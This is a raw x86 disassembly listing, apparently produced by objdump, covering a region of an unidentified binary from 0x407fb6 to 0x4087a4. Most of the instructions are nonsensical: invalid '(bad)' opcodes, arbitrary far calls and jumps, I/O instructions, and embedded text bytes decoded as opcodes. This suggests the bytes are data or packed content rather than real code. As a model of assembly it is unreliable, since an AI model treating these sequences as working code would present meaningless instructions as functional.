  407fb6:	rol    al,1
  407fb8:	lock (bad) 
  407fba:	dec    DWORD PTR [eax]
  407fbc:	aas    
  407fbd:	(bad)  
  407fbe:	jmp    FWORD PTR [edi+ebp*8]
  407fc1:	(bad)  
  407fc2:	call   FWORD PTR ds:0xb1fdd3b0
  407fc8:	ins    BYTE PTR es:[edi],dx
  407fc9:	push   0xffffffef
  407fcb:	adc    eax,0xe3ba2521
  407fd0:	mov    esp,DWORD PTR [edx-0x2e]
  407fd3:	xchg   esp,eax
  407fd4:	mov    bh,0x3
  407fd6:	int3   
  407fd7:	xchg   ebp,eax
  407fd8:	lods   eax,DWORD PTR ds:[esi]
  407fd9:	pop    edx
  407fda:	sahf   
  407fdb:	inc    DWORD PTR [ebp*4+0x4ff237b]
  407fe2:	add    al,0x4
  407fe4:	dec    esi
  407fe5:	call   0x592750ea
  407fea:	cmp    DWORD PTR [eax+eax*2-0x3476bf3f],0x5d
  407ff2:	std    
  407ff3:	xor    eax,0xb173ddf6
  407ff8:	mov    dl,dl
  407ffa:	gs or  al,0x65
  407ffd:	jno    0x408063
  407fff:	in     eax,dx
  408000:	sbb    edi,DWORD PTR [ecx+0xb]
  408003:	sbb    BYTE PTR ds:0x66045ef2,ah
  408009:	ins    DWORD PTR es:[edi],dx
  40800a:	arpl   WORD PTR [ebp+0x6b],bp
  40800d:	ins    DWORD PTR es:[edi],dx
  40800e:	gs ins DWORD PTR es:[edi],dx
  408010:	cmp    ch,BYTE PTR [esi+0x74]
  408013:	push   edx
  408014:	arpl   WORD PTR [edx+0x6d],sp
  408017:	sub    al,0x74
  408019:	ins    DWORD PTR es:[edi],dx
  40801a:	ja     0x40807f
  40801c:	ins    DWORD PTR es:[edi],dx
  40801d:	arpl   WORD PTR [esi+0x41],sp
  408020:	outs   dx,BYTE PTR ds:[esi]
  408021:	ins    DWORD PTR es:[edi],dx
  408022:	addr16 jne 0x408097
  408025:	and    ch,BYTE PTR [esi]
  408027:	gs inc ecx
  408029:	outs   dx,DWORD PTR ds:[esi]
  40802a:	ins    DWORD PTR es:[edi],dx
  40802b:	arpl   WORD PTR cs:[edx+0x20],sp
  40802f:	ins    DWORD PTR es:[edi],dx
  408030:	je     0x4080a5
  408032:	je     0x40809a
  408034:	outs   dx,BYTE PTR ds:[esi]
  408035:	addr16 or eax,0x72746569
  40803b:	sub    DWORD PTR [edi+0x69],ebp
  40803e:	imul   ebp,DWORD PTR [edi+0x2e],0x65203e3a
  408045:	sub    DWORD PTR [ecx+ebp*2],edi
  408048:	imul   esi,DWORD PTR [ebp+0x53],0x20736765
  40804f:	arpl   WORD PTR [edx+0x65],si
  408052:	sub    al,0x6f
  408054:	je     0x408084
  408056:	and    BYTE PTR [esi+0x3c],ch
  408059:	and    BYTE PTR [edi+0x22],ch
  40805c:	or     eax,0x53725373
  408061:	arpl   WORD PTR [ebp+0x69],cx
  408064:	inc    ecx
  408065:	jae    0x4080ba
  408067:	bound  edx,QWORD PTR [ebx+0x20]
  40806a:	bound  ebp,QWORD PTR [ecx+0x65]
  40806d:	or     ah,BYTE PTR [edx+0x75]
  408070:	gs je  0x4080e7
  408073:	imul   ebp,DWORD PTR [edx+edx*2+0x65],0x536d6f63
  40807b:	jb     0x4080be
  40807d:	add    al,0x7d
  40807f:	sub    al,0x4
  408081:	add    al,0x4
  408083:	lea    ecx,[ebp-0x72727273]
  408089:	lea    ecx,[ebp+0x46ad4a8d]
  40808f:	int3   
  408090:	int3   
  408091:	int3   
  408092:	int3   
  408093:	int3   
  408094:	int3   
  408095:	int3   
  408096:	int3   
  408097:	int3   
  408098:	add    BYTE PTR [eax],al
  40809a:	inc    ebp
  40809b:	jle    0x408036
  40809d:	adc    eax,0xab0b8178
  4080a2:	icebp  
  4080a3:	mov    esi,DWORD PTR [ebx-0x7b]
  4080a6:	sub    eax,0xcfa7f77c
  4080ab:	in     eax,dx
  4080ac:	out    0xd3,al
  4080ae:	mov    bl,al
  4080b0:	pushf  
  4080b1:	aam    0x0
  4080b3:	add    bh,ch
  4080b5:	mov    eax,0xab2595ca
  4080ba:	outs   dx,DWORD PTR ds:[esi]
  4080bb:	stos   BYTE PTR es:[edi],al
  4080bc:	retf   
  4080bd:	mov    esi,0xde1325c7
  4080c2:	pusha  
  4080c3:	ja     0x4080e6
  4080c5:	fwait
  4080c6:	inc    eax
  4080c7:	inc    esi
  4080c8:	or     eax,0x3d1a52f5
  4080cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4080ce:	pop    ds
  4080cf:	inc    bh
  4080d1:	add    BYTE PTR [eax],al
  4080d3:	jmp    0x416795
  4080d8:	stos   BYTE PTR es:[edi],al
  4080d9:	xor    al,0x1c
  4080db:	add    BYTE PTR [eax],al
  4080dd:	fdiv   st(3),st
  4080df:	iret   
  4080e0:	xor    di,WORD PTR [esi+0x4bfb1c86]
  4080e7:	int3   
  4080e8:	mov    eax,ds:0xd463f352
  4080ed:	arpl   WORD PTR [edx-0x6d],bx
  4080f0:	jno    0x4080c6
  4080f2:	sbb    edx,DWORD PTR [esi+0x49]
  4080f8:	mov    edi,0xe0000b5
  4080fd:	mov    ds:0x0,al
	...
  40810a:	cmp    eax,0x498dc49f
  40810f:	int    0x74
  408111:	inc    ecx
  408112:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408113:	mov    ds:0xa28146dd,al
  408118:	in     al,dx
  408119:	cmp    edx,DWORD PTR [edx+ebp*4-0x1be640ea]
  408120:	dec    ebp
  408121:	lods   eax,DWORD PTR ds:[esi]
  408122:	push   0x6a
  408124:	push   0x6a
  408126:	push   0x6a
  408128:	push   0x6a
  40812a:	push   0xffffffff
  40812c:	(bad)  
  40812d:	cmp    esi,esi
  40812f:	cmp    eax,0xeeffff75
  408134:	test   eax,0xbafd603
  408139:	and    al,0xf7
  40813b:	cmp    eax,0x87764ef5
  408140:	inc    ecx
  408141:	out    0xb1,eax
  408143:	shr    BYTE PTR [ebx],0xc
  408146:	jb     0x4081b4
  408148:	enter  0x63be,0x40
  40814c:	syscall 
  40814e:	jmp    0x6d8dd6fb
  408153:	into   
  408154:	jle    0x40812a
  408156:	(bad)  
  408157:	push   eax
  408159:	push   0x1f2ffff
  40815e:	lods   al,BYTE PTR ds:[esi]
  40815f:	(bad)  
  408160:	call   0x9876119d
  408165:	mov    ecx,ebx
  408167:	mov    eax,0xf9faa298
  40816c:	inc    ebx
  40816d:	xchg   BYTE PTR [ebx],ch
  40816f:	or     al,0x8a
  408171:	and    eax,0xc27f74bc
  408176:	mov    cl,0xfb
  408178:	xchg   eax,ebp
  40817a:	call   0xf267b167
  40817f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408180:	and    eax,0x34c4f1b8
  408185:	enter  0x8bf3,0x38
  408189:	stos   BYTE PTR es:[edi],al
  40818a:	sub    BYTE PTR ss:[eax-0x7c2f8721],ah
  408191:	fistp  WORD PTR [eax-0x6d]
  408194:	add    al,0xcd
  408196:	in     eax,0xb
  408198:	out    0xe8,eax
  40819a:	call   0xe89d9c02
  40819f:	call   0x40828c
  4081a4:	add    BYTE PTR [eax],al
  4081a6:	add    BYTE PTR [eax],al
  4081a8:	add    BYTE PTR [eax],al
  4081aa:	jmp    0x408150
  4081ac:	and    edx,DWORD PTR [eax+0x50]
  4081af:	push   eax
  4081b0:	push   eax
  4081b1:	push   eax
  4081b2:	push   eax
  4081b3:	push   eax
  4081b4:	push   eax
  4081b5:	push   eax
  4081b6:	add    BYTE PTR [eax],al
  4081b8:	out    0xee,eax
  4081ba:	mov    cl,0xd7
  4081bc:	sbb    eax,0x8d036879
  4081c1:	je     0x408144
  4081c3:	jnp    0x408223
  4081c5:	sbb    cl,bl
  4081c7:	pop    ss
  4081c8:	mov    eax,0x98da5b6
  4081cd:	retf   
  4081ce:	lock pop es
  4081d0:	add    BYTE PTR [eax],al
  4081d2:	or     cl,BYTE PTR [edx]
  4081d4:	add    BYTE PTR [eax],al
  4081d6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4081d7:	add    BYTE PTR es:[eax],al
  4081da:	ja     0x4081c9
  4081dc:	sti    
  4081dd:	fcomi  st,st(5)
  4081df:	rcr    DWORD PTR [esp+edi*8-0x5612eee0],1
  4081e6:	addr16 popf 
  4081e8:	xor    BYTE PTR [ecx],cl
  4081ea:	lea    ebx,[ebp-0x4cd61fe4]
  4081f0:	int    0xa8
  4081f2:	add    bh,bh
  4081f4:	push   ds
  4081f5:	and    dl,dh
  4081f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4081f8:	(bad)  
  4081f9:	(bad)  
  4081fa:	call   FWORD PTR [edi-0x1a]
  4081fd:	jmp    0x4081ec
  4081ff:	cs pop esp
  408201:	es mov edx,0xc3cb114f
  408207:	mov    ds:0x7f991c1b,eax
  40820c:	mov    dl,cl
  40820e:	mov    edx,0xd1234684
  408213:	inc    esp
  408214:	loop   0x408202
  408216:	dec    eax
  408217:	add    al,0xe0
  408219:	and    ch,dl
  40821b:	rcl    edx,1
  40821d:	ret    
  40821e:	(bad)  
  40821f:	(bad)  
  408220:	jns    0x40828a
  408222:	(bad)  
  408223:	(bad)  
  408224:	(bad)  
  408225:	(bad)  
  408226:	(bad)  
  408227:	(bad)  
  408228:	(bad)  
  408229:	(bad)  
  40822a:	(bad)  
  40822b:	(bad)  
  40822c:	(bad)  
  40822d:	call   FWORD PTR [ebp-0x2a]
  408230:	and    eax,0xffffffff
  408235:	(bad)  
  408236:	(bad)  
  408237:	(bad)  
  408238:	(bad)  
  408239:	(bad)  
  40823a:	(bad)  
  40823b:	jmp    FWORD PTR [edx-0x16]
  40823e:	inc    edi
  40823f:	out    dx,eax
  408240:	sub    DWORD PTR ds:0x61180e17,0x3d
  408247:	test   DWORD PTR [ecx-0x4bebe9b5],edx
  40824d:	into   
  40824e:	push   es
  40824f:	iret   
  408250:	xor    eax,0xff90f65d
  408255:	(bad)  
  408256:	fild   QWORD PTR [ecx-0x47998a57]
  40825c:	retf   0x8fb3
  40825f:	add    al,0x5c
  408261:	mov    al,ds:0xefbc48ef
  408266:	repnz push edx
  408268:	or     esi,eax
  40826a:	outs   dx,BYTE PTR ds:[esi]
  40826b:	pop    esp
  40826c:	sbb    DWORD PTR [eax],eax
  40826e:	sahf   
  40826f:	mov    bh,bl
  408271:	push   ebp
  408272:	push   ebx
  408273:	(bad)  
  408274:	jmp    DWORD PTR [esi]
  408276:	xchg   BYTE PTR [edi-0x532f0001],ah
  40827c:	sar    bh,cl
  40827e:	push   eax
  408280:	out    dx,al
  408281:	out    0x34,eax
  408283:	arpl   bx,di
  408285:	retf   
  408286:	dec    ebx
  408287:	mov    ds:0xb8ca3694,eax
  40828c:	mov    ch,0x89
  40828e:	sbb    ebp,ebx
  408290:	sub    DWORD PTR [eax+0x74],ecx
  408293:	lods   al,BYTE PTR ds:[esi]
  408294:	pop    es
  408295:	push   0x7d
  408297:	(bad)  
  408298:	(bad)  
  408299:	jmp    DWORD PTR [ebp-0x18000023]
  40829f:	cld    
  4082a0:	(bad)  
  4082a1:	(bad)  
  4082a2:	call   DWORD PTR [eax+0x50]
  4082a5:	push   eax
  4082a6:	push   eax
  4082a7:	push   eax
  4082a8:	push   eax
  4082a9:	push   eax
  4082aa:	push   eax
  4082ab:	push   eax
  4082ac:	or     BYTE PTR [ecx-0xa0fe9a1],dl
  4082b2:	(bad)  
  4082b3:	(bad)  
  4082b4:	dec    eax
  4082b5:	loope  0x4082c5
  4082b7:	dec    ebx
  4082b8:	jl     0x4082ea
  4082ba:	add    ah,0x93
  4082bd:	jge    0x4082a2
  4082bf:	addr16 retf 
  4082c1:	sahf   
  4082c2:	add    eax,0x8d8d8d2a
  4082c7:	lea    ecx,[ebp-0x72727273]
  4082cd:	add    BYTE PTR [eax],al
  4082cf:	leave  
  4082d0:	bound  edx,QWORD PTR [eax+0x2e000091]
  4082d6:	sbb    al,0xe9
  4082d8:	pop    ecx
  4082d9:	adc    DWORD PTR [ebp-0x77],ecx
  4082dc:	or     cl,BYTE PTR [ecx]
  4082de:	cwde   
  4082df:	or     edi,DWORD PTR [esi+0x51]
  4082e2:	push   ecx
  4082e3:	xchg   edi,eax
  4082e4:	xchg   ebp,eax
  4082e5:	xchg   edx,eax
  4082e6:	cmp    al,0x2d
  4082e8:	dec    edx
  4082e9:	sub    ecx,0x2e
  4082ec:	jne    0x4082dd
  4082ee:	addr16 xchg ebx,eax
  4082f0:	shr    ecx,0x5c
  4082f3:	inc    edi
  4082f4:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  4082f6:	cmc    
  4082f7:	or     eax,DWORD PTR [eax]
  4082f9:	add    BYTE PTR [edi-0x2effff79],dh
  4082ff:	and    al,0x98
  408301:	add    BYTE PTR [ebx-0x13817bb0],cl
  408307:	aad    0x9c
  408309:	mov    al,ds:0x798fe024
  40830e:	call   0xa185:0x15ba981
  408315:	daa    
  408316:	fidivr DWORD PTR [edx-0x4f]
  408319:	stc    
  40831a:	fisttp WORD PTR [ebx+0x7aa38b8b]
  408320:	jae    0x4082d1
  408322:	mov    ch,0x97
  408324:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408325:	retf   
  408326:	cmp    BYTE PTR [ecx+0x10],bh
  408329:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40832a:	or     DWORD PTR [ebp+0x2d213395],0x149ff8d9
  408334:	mov    DWORD PTR [ecx+0x2c],edi
  408337:	sbb    DWORD PTR [edi],ecx
  408339:	lods   al,BYTE PTR ds:[esi]
  40833a:	pusha  
  40833b:	mov    ecx,DWORD PTR [ebx-0x74a94b02]
  408341:	mov    ecx,DWORD PTR [ebx-0x72727273]
  408347:	lea    ecx,[ebp+0x138d8d8d]
  40834d:	add    ah,BYTE PTR [eax]
	...
  408357:	add    BYTE PTR [eax],al
  408359:	add    BYTE PTR [edx],dl
  40835b:	jl     0x4082ed
  40835d:	dec    esi
  40835e:	xor    DWORD PTR [edi+0x33],0xffffffae
  408362:	fsub   st(6),st
  408364:	dec    ecx
  408365:	repnz adc esp,DWORD PTR ds:[ecx+0x10]
  40836a:	inc    eax
  40836b:	and    DWORD PTR [edi],eax
  40836d:	add    eax,0xf6655caa
  408372:	add    BYTE PTR [eax],al
  408374:	cld    
  408375:	leave  
  408376:	add    BYTE PTR [eax],al
  408378:	and    dh,al
  40837a:	add    BYTE PTR [eax],al
  40837c:	and    BYTE PTR [ebp-0x327ec479],ah
  408382:	mov    cl,0x99
  408384:	ins    DWORD PTR es:[edi],dx
  408385:	lods   al,BYTE PTR ds:[esi]
  408386:	adc    eax,0x53c4c0cf
  40838b:	mov    ebp,0x156d0961
  408390:	add    eax,0x7730e3
  408395:	add    DWORD PTR [edx-0x7c529204],0xffffff83
  40839c:	sub    DWORD PTR [ecx+0x49d915de],0x6c
  4083a3:	jns    0x408375
  4083a5:	stos   DWORD PTR es:[edi],eax
  4083a6:	popa   
  4083a7:	pop    eax
  4083a8:	jl     0x40839f
  4083aa:	pop    ebp
  4083ab:	mov    al,ds:0xa553afee
  4083b0:	enter  0xf67b,0x93
  4083b4:	sahf   
  4083b5:	dec    edi
  4083b6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4083b7:	push   es
  4083b8:	mov    dl,0x58
  4083ba:	push   ss
  4083bb:	mov    eax,0x6da6612b
  4083c0:	add    DWORD PTR [ebx-0x7c7c98f0],0xffffff83
  4083c7:	push   eax
  4083c8:	push   eax
  4083c9:	push   eax
  4083ca:	push   eax
  4083cb:	push   eax
  4083cc:	push   eax
  4083cd:	push   eax
  4083ce:	push   eax
  4083cf:	push   eax
  4083d0:	ja     0x4083b0
  4083d2:	inc    esp
  4083d3:	mov    ecx,DWORD PTR [ebx-0x74747475]
  4083d9:	mov    ecx,DWORD PTR [ebx-0xffff75]
  4083df:	psubw  mm5,QWORD PTR [ebx]
  4083e2:	lahf   
  4083e3:	in     al,dx
  4083e4:	sub    dh,al
  4083e6:	sub    BYTE PTR [edx+0x6d536572],al
  4083ec:	push   edi
  4083ed:	and    BYTE PTR cs:[esi],ch
  4083f0:	and    dh,BYTE PTR [edx+0x74]
  4083f3:	and    BYTE PTR [ebp+0x72],ch
  4083f6:	pop    ebx
  4083f7:	and    esi,DWORD PTR [ebp+0x65]
  4083fa:	and    BYTE PTR ds:[ecx+0x6e],al
  4083fe:	or     eax,0x282e7465
  408403:	jb     0x408471
  408405:	popa   
  408406:	data16 jne 0x408429
  408409:	and    ch,BYTE PTR [eiz*2+0x3c65723c]
  408410:	inc    ebx
  408411:	cs gs dec ebp
  408414:	gs gs jb 0x40846a
  408418:	je     0x408487
  40841a:	inc    ecx
  40841b:	je     0x40843d
  40841d:	bound  edi,QWORD PTR [ecx+0x65]
  408420:	imul   ecx,DWORD PTR [edx],0x656d6276
  408426:	ins    DWORD PTR es:[edi],dx
  408427:	gs gs ins DWORD PTR es:[edi],dx
  40842a:	outs   dx,BYTE PTR ds:[esi]
  40842b:	je     0x40848e
  40842d:	arpl   WORD PTR ds:0x530d7220,di
  408433:	cmp    al,0x43
  408435:	ins    BYTE PTR es:[edi],dx
  408436:	push   esi
  408437:	gs ins DWORD PTR es:[edi],dx
  408439:	cmp    al,0x1e
  40843b:	ins    DWORD PTR es:[edi],dx
  40843c:	xchg   edi,eax
  40843d:	inc    ebx
  40843e:	pusha  
  40843f:	int    0x66
  408441:	mov    bh,0x8f
  408443:	pop    ebp
  408444:	sub    ah,BYTE PTR [esi+ecx*1]
  408447:	dec    ecx
  408448:	add    BYTE PTR [eax],al
  40844a:	jbe    0x4083d7
  40844c:	aas    
  40844d:	inc    esp
  40844e:	xchg   BYTE PTR [ebp-0x10],al
  408451:	adc    dl,BYTE PTR [esi+edx*1+0x2e0fae8b]
  408458:	aaa    
  408459:	pusha  
  40845a:	sbb    BYTE PTR [ebx+0x7598de20],dh
  408460:	imul   ebp,DWORD PTR [ebx+esi*2-0x2cdbe10c],0x0
  408468:	add    BYTE PTR [ebx-0x7d],al
  40846b:	in     al,0x0
  40846d:	add    ch,al
  40846f:	cs push ebp
  408471:	add    BYTE PTR [ebx-0x103cf773],cl
  408477:	push   0xae09ce9b
  40847c:	(bad)  
  40847d:	dec    edi
  40847e:	and    ah,dl
  408480:	dec    eax
  408481:	add    ecx,edx
  408483:	dec    esp
  408484:	adc    cl,BYTE PTR [edx-0x784ac8ac]
  40848a:	loope  0x408417
  40848c:	mov    ecx,DWORD PTR [ebx-0x7474d77f]
  408492:	cdq    
  408493:	test   eax,0x8b8b8b
	...
  4084a0:	sbb    DWORD PTR [ecx],ebx
  4084a2:	xchg   esp,eax
  4084a3:	and    BYTE PTR [ebp+0x2d],0x90
  4084a7:	ins    BYTE PTR es:[edi],dx
  4084a8:	inc    edi
  4084a9:	sub    al,0x87
  4084ab:	outs   dx,BYTE PTR ds:[esi]
  4084ac:	mov    ecx,0xc2989a85
  4084b1:	sub    BYTE PTR [esi+edx*1-0x626f77d7],dl
  4084b8:	(bad)  
  4084b9:	(bad)  
  4084ba:	(bad)  
  4084bb:	(bad)  
  4084bc:	(bad)  
  4084bd:	(bad)  
  4084be:	(bad)  
  4084bf:	(bad)  
  4084c0:	inc    DWORD PTR [eax]
  4084c2:	add    BYTE PTR [edx+0x24],bl
  4084c5:	lods   al,BYTE PTR ds:[esi]
  4084c6:	rol    DWORD PTR [eax],1
  4084c8:	add    dh,dl
  4084ca:	cmp    esp,DWORD PTR [edx+0x15]
  4084cd:	dec    ecx
  4084ce:	mov    eax,0x94ce29aa
  4084d3:	lods   al,BYTE PTR ds:[esi]
  4084d4:	dec    ebp
  4084d5:	ficom  DWORD PTR [esi+0xbe86acb]
  4084db:	pop    ds
  4084dc:	add    cl,BYTE PTR ds:0x2fc6025d
  4084e2:	sahf   
  4084e3:	dec    ebp
  4084e4:	jmp    0x4084bb
  4084e6:	add    al,0xf1
  4084e8:	or     BYTE PTR [esi+esi*2],ch
  4084eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4084ec:	add    BYTE PTR [eax],al
  4084ee:	jnp    0x408489
  4084f0:	add    BYTE PTR [eax],al
  4084f2:	jmp    0x3f15:0xff000bd5
  4084f9:	push   edi
  4084fa:	xor    eax,0xd1a1b883
  4084ff:	xor    eax,0x5c7d752d
  408504:	or     BYTE PTR [edi+0x38c82760],dl
  40850a:	push   esi
  40850b:	ror    BYTE PTR [ecx+eiz*8-0x19],1
  408512:	neg    DWORD PTR [esi]
  408514:	and    BYTE PTR [ecx-0x1780c855],bl
  40851a:	add    bh,BYTE PTR [edx-0x1b]
  40851d:	in     al,0xdd
  40851f:	pop    ecx
  408520:	jmp    0xaee8559a
  408525:	pushf  
  408526:	jne    0x4084ba
  408528:	pop    esi
  408529:	mov    esp,0xbbbb8ab7
  40852e:	iret   
  40852f:	(bad)  
  408530:	call   FWORD PTR [ebx-0xf46]
  408536:	inc    DWORD PTR [eax]
	...
  408540:	xchg   ebx,eax
  408541:	mov    edx,0x25
	...
  40854e:	scas   eax,DWORD PTR es:[edi]
  40854f:	add    eax,0x7038806c
  408554:	retf   
  408555:	mov    ecx,0xc0c17c67
  40855a:	xchg   esp,eax
  40855b:	hlt    
  40855c:	mov    ecx,0x15cb1f01
  408561:	enter  0x9dbb,0x64
  408565:	inc    ecx
  408566:	add    BYTE PTR [eax],al
  408568:	retf   
  408569:	out    dx,al
  40856a:	add    BYTE PTR [eax],al
  40856c:	(bad)  
  40856d:	xor    eax,0x19a30000
  408572:	pop    ebp
  408573:	mov    fs:0x3fbb3fb8,eax
  408579:	push   ds
  40857a:	xchg   edx,eax
  40857b:	pop    esp
  40857c:	inc    ecx
  40857d:	test   al,0xc5
  40857f:	mov    ds:0x8547b7b,eax
  408584:	in     eax,dx
  408585:	xchg   bl,ah
  408587:	retf   
  408588:	add    BYTE PTR [edx+0x3a],ch
  40858b:	dec    ebp
  40858c:	add    bh,bl
  40858e:	push   0x6a
  408590:	push   0x7b
  408592:	pop    esi
  408593:	and    BYTE PTR [esi*4+0x6a530cde],dh
  40859a:	out    dx,eax
  40859b:	pop    ebp
  40859c:	and    ebp,DWORD PTR [edx+0x4ddb8db8]
  4085a2:	sbb    DWORD PTR [ebp-0xfc0e19a],eax
  4085a8:	mov    WORD PTR [eax-0x62],?
  4085ab:	adc    al,0xaf
  4085ad:	cmp    DWORD PTR [eax],ebx
  4085af:	repz ds out 0x8f,al
  4085b3:	fsubr  QWORD PTR [edx+0x6a]
  4085b6:	loop   0x40853b
  4085b8:	push   0x6a
  4085ba:	push   0x0
	...
  4085c4:	out    0x7,eax
  4085c6:	test   edi,edi
  4085c8:	(bad)  
  4085c9:	(bad)  
  4085ca:	(bad)  
  4085cb:	(bad)  
  4085cc:	(bad)  
  4085cd:	(bad)  
  4085ce:	(bad)  
  4085cf:	inc    DWORD PTR [ebp+0x7f37b085]
  4085d5:	sub    DWORD PTR [edx-0x71781f3a],edi
  4085db:	test   BYTE PTR [eax-0x3b87f37e],dh
  4085e1:	ja     0x4085bd
  4085e3:	cmp    eax,0x23ad76a2
  4085e8:	cmp    BYTE PTR [edi-0x7b],ch
  4085eb:	test   esi,ebx
  4085ed:	das    
  4085ee:	addr16 xchg ecx,eax
  4085f0:	pushf  
  4085f1:	sbb    eax,0x6450a467
  4085f6:	and    al,0xc9
  4085f8:	aam    0x9d
  4085fa:	shr    DWORD PTR [esi-0x48],cl
  4085fd:	sbb    DWORD PTR [eax+ecx*4],0xffffffa4
  408601:	loope  0x408651
  408603:	xchg   edx,eax
  408604:	push   edi
  408605:	(bad)  
  408606:	mov    ah,0xe1
  408608:	push   0x4d7f8585
  40860d:	sbb    eax,0xa1c88585
  408612:	mov    ecx,0x65ba0085
  408617:	lock fucomp st(4)
  40861a:	mov    edx,0xb65129d2
  40861f:	dec    edx
  408620:	add    BYTE PTR [esi+0x52225da],dh
  408626:	int3   
  408627:	and    dh,BYTE PTR [eax+0x1b]
  40862a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40862b:	jge    0x408687
  40862d:	add    BYTE PTR [eax],al
  40862f:	add    bh,dh
  408631:	rol    DWORD PTR [eax],0x0
  408634:	ins    BYTE PTR es:[edi],dx
  408635:	mov    dh,0x0
	...
  40863f:	add    BYTE PTR [eax],al
  408641:	add    BYTE PTR [ebx],ah
  408643:	jbe    0x4085d0
  408645:	ret    0xae84
  408648:	fimul  DWORD PTR [ecx+0x13a1eb73]
  40864e:	dec    edi
  40864f:	mov    edi,0x7fbb617d
  408654:	pop    esp
  408655:	nop
  408656:	outs   dx,BYTE PTR ds:[esi]
  408657:	cs mov bl,0xe0
  40865a:	inc    ebp
  40865b:	inc    ebp
  40865c:	inc    ebp
  40865d:	inc    ebp
  40865e:	inc    ebp
  40865f:	inc    ebp
  408660:	inc    ebp
  408661:	inc    ebp
  408662:	inc    ebp
  408663:	(bad)  
  408664:	dec    esi
  408666:	xor    BYTE PTR [ecx+eax*2-0x1],cl
  40866a:	(bad)  
  40866b:	fistp  QWORD PTR [esi+ebx*2-0x79fae179]
  408672:	mov    dh,0x46
  408674:	cmp    eax,0x2eb08df7
  408679:	mov    esp,0xdab0011c
  40867e:	into   
  40867f:	xchg   ebp,eax
  408680:	and    dh,BYTE PTR [edi+0x14]
  408683:	gs push ds
  408685:	and    bh,cl
  408687:	hlt    
  408688:	fisubr DWORD PTR [bp+si+0x74b9]
  40868d:	out    0xff,eax
  40868f:	call   FWORD PTR [esi+0x46ffff2e]
  408695:	out    dx,eax
  408696:	add    bh,bh
  408698:	and    BYTE PTR [eax],ah
  40869a:	ins    DWORD PTR es:[edi],dx
  40869b:	arpl   WORD PTR [esi],bp
  40869d:	inc    ecx
  40869e:	imul   esp,DWORD PTR [ecx+0x69],0x44207272
  4086a5:	arpl   WORD PTR [ebp+0x3a],sp
  4086a8:	cmp    ah,BYTE PTR [ebx+0x4d]
  4086ab:	outs   dx,DWORD PTR ds:[esi]
  4086ac:	and    BYTE PTR [ebx+0x69],dh
  4086af:	bound  esp,QWORD PTR gs:[edx+0x6e]
  4086b3:	gs gs cmp al,0x2e
  4086b7:	or     cl,BYTE PTR [eax+0x74]
  4086ba:	outs   dx,BYTE PTR ds:[esi]
  4086bb:	jb     0x40872b
  4086bd:	outs   dx,DWORD PTR ds:[esi]
  4086be:	gs jae 0x4086ef
  4086c1:	and    BYTE PTR [ecx+ebp*2+0x2e],dh
  4086c5:	outs   dx,DWORD PTR ds:[esi]
  4086c6:	jb     0x40872d
  4086c8:	gs jae 0x408734
  4086cb:	jae    0x408736
  4086cd:	cmp    al,0xd
  4086cf:	gs cmp al,0x32
  4086d2:	jae    0x408736
  4086d4:	cmp    al,0x3e
  4086d6:	jb     0x4086f8
  4086d8:	gs ds or ax,0x6e20
  4086de:	and    BYTE PTR [esi+0x2e],dh
  4086e1:	jo     0x408757
  4086e3:	or     eax,0x72446b41
  4086e8:	je     0x40874f
  4086ea:	imul   esi,DWORD PTR [eax+0x6f],0x6e4e3c65
  4086f1:	or     bh,BYTE PTR [esi]
  4086f3:	push   edx
  4086f4:	fs cmp al,0x43
  4086f7:	ja     0x408766
  4086f9:	outs   dx,DWORD PTR gs:[esi]
  4086fb:	outs   dx,DWORD PTR ds:[esi]
  4086fc:	jae    0x408764
  4086fe:	jae    0x40876d
  408700:	inc    esp
  408701:	je     0x408768
  408703:	cs mov esi,eax
  408706:	xchg   esi,eax
  408707:	mov    bl,0x1f
  408709:	(bad)  
  40870a:	sahf   
  40870b:	inc    ecx
  40870c:	sbb    ah,BYTE PTR [esp+ebp*4]
  40870f:	loopne 0x40875d
  408711:	inc    ebp
  408712:	jnp    0x408724
  408714:	fbld   TBYTE PTR [eax+0x5d]
  408717:	in     al,0x7
  408719:	dec    eax
  40871a:	popa   
  40871b:	ss xor al,0x8b
  40871e:	mov    ecx,DWORD PTR [ebx-0x5fdabe3e]
  408724:	mov    ebx,0x1069fbad
  408729:	int    0x90
  40872b:	scas   eax,DWORD PTR es:[edi]
  40872c:	mov    eax,0x569988fd
  408731:	cmp    DWORD PTR [edx+esi*4-0xc9fb61e],0x2b
  408739:	mov    bh,0xe
  40873b:	add    al,BYTE PTR [edx]
  40873d:	mov    ecx,DWORD PTR [ebx-0x7453740a]
  408743:	mov    ecx,DWORD PTR [ebx-0x74747475]
  408749:	mov    ecx,DWORD PTR [ebx+0x4e8b8b8b]
  40874f:	adc    BYTE PTR [edi-0x34],dl
  408752:	int3   
  408753:	int3   
  408754:	int3   
  408755:	int3   
  408756:	int3   
  408757:	int3   
  408758:	int3   
  408759:	int3   
  40875a:	(bad)  
  40875b:	psubsw mm6,QWORD PTR [ecx-0x58555bc3]
  408762:	dec    edi
  408763:	jmp    0xc685ab54
  408768:	push   edi
  408769:	xor    bl,BYTE PTR [ebx-0x41]
  40876c:	sub    al,0x8
  40876e:	cmp    eax,0x4991a58e
  408773:	(bad)  
  408774:	(bad)  
  408775:	pavgb  mm7,QWORD PTR [ebp+0x5b710f0f]
  40877c:	(bad)  
  40877d:	setp   BYTE PTR [esp+ebx*8]
  408781:	cmp    al,0x4
  408783:	pop    es
  408784:	push   cs
  408785:	jno    0x408792
  408787:	repz or DWORD PTR [edi-0x28],ebx
  40878b:	push   cs
  40878c:	repnz adc DWORD PTR [edi-0x6],esi
  408790:	mov    esp,0x94777e38
  408795:	mov    dl,0xf
  408797:	push   eax
  408798:	sub    ch,BYTE PTR [ebx-0x7]
  40879b:	xchg   DWORD PTR [eax+0x50],edx
  40879e:	push   eax
  40879f:	fwait
  4087a0:	push   ss
  4087a1:	mov    dh,0xd8
  4087a3:	leave  
  4087a4:	mov    ebp,DWORD PTR [edx+eiz*2+0x1bf9e5b0]
